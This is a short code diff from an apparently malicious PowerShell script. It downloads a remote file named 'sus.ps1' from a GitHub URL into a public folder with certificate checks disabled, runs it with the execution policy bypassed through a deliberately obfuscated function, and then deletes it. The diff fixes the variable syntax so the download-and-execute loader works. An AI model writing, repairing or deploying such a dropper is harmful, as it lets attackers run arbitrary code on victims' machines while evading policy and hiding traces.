@@ -73,7 +73,7 @@ function fhuwhfkahsdkfhailwf {
 	}
 }
 curl.exe -k -L "https://github.com/jecoma/basco/raw/refs/heads/main/sus.ps1" -o "c:\users\public\music\sus.ps1"
-awefhas='powershell.exe';
-iiwuierkj='-ep bypass -file c:\users\public\music\sus.ps1';
-fhuwhfkahsdkfhailwf -src awefhas -arg iiwuierkj;
+$awefhas='powershell.exe';
+$iiwuierkj='-ep bypass -file c:\users\public\music\sus.ps1';
+fhuwhfkahsdkfhailwf -src $awefhas -arg $iiwuierkj;
 remove-item c:\users\public\music\sus.ps1;
